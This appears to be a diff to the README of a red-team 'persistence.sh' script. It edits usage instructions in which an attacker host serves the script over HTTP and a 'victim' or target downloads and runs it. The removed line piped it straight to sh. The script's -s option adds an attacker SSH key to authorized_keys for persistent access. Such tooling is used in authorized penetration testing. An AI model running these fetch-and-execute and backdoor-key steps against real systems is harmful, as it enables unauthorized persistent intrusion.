@@ -7,22 +7,26 @@ Available parts:
 
 ## Usage
 
-```bash
+```sh
 # From github
 curl -LJO https://github.com/McSquizzy/red-team-toolbox/blob/main/persistence/persistence.sh
-./persistence.sh -h
+sh persistence.sh -h
 ```
-```bash
+```sh
 # Local network
-sudo python -m SimpleHTTPServer 8000 #Host
-curl <Host>:8000/persistence.sh | sh #Victim
+# Host:
+python -m SimpleHTTPServer 8000 #or
+python3 -m http.server 8000
+# Target
+curl -LJO <Host>:8000/persistence.sh
+sh persistence.sh -h
 ```
 
 ### Parameters
-```bash
-./persistence.sh -h
+```sh
+sh persistence.sh -h
 
-Usage: ./persistence.sh [-h] [-s]
+Usage: sh persistence.sh [-h] [-s]
 
 -s <SSH public key>
   Trying to add ssh public key to authorized_keys
